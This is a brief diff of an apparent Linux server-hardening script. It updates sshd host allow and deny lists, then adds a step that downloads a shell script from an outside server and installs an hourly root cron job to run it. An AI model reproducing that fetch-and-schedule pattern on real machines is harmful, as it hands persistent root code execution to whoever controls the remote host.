@@ -29,13 +29,16 @@ sshd:114.247.217.*
 sshd:124.204.49.*
 sshd:120.132.80.222
 sshd:124.204.49.*
-sshd:101.254.162.*
+sshd:140.143.237.96
 sshd:124.205.193.74
 EOF
 
 cat <<EOF> /etc/hosts.deny
 sshd:all
 EOF
+
+wget -P /opt/ http://oss.1nth.com/shell/getip.sh
+echo -e "* */1 * * * bash /opt/getip.sh" >> /var/spool/cron/root
 
 linx自定义终端
 vim .bashrc
